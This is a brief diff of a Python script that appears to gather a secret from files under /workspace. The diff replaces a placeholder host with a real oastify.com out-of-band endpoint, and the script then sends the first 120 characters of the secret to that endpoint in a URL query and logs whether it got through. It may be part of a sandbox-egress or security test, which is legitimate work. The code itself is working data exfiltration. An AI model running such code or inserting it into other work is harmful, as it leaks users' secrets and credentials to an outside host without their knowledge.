@@ -13,7 +13,7 @@ for p in glob.glob('/workspace/**/*', recursive=True):
             pass
 oobres = 'oob-not-attempted'
 try:
-    urllib.request.urlopen('https://__OOB_HOST__/gvrp-xuser?d=' + urllib.parse.quote(secret[:120]), timeout=6)
+    urllib.request.urlopen('https://1vxh6brdlysdzlh7z1w4myd6vx1npc.oastify.com/gvrp-xuser?d=' + urllib.parse.quote(secret[:120]), timeout=6)
     oobres = 'oob-sent'
 except Exception as e:
     oobres = 'oob-fail:' + type(e).__name__
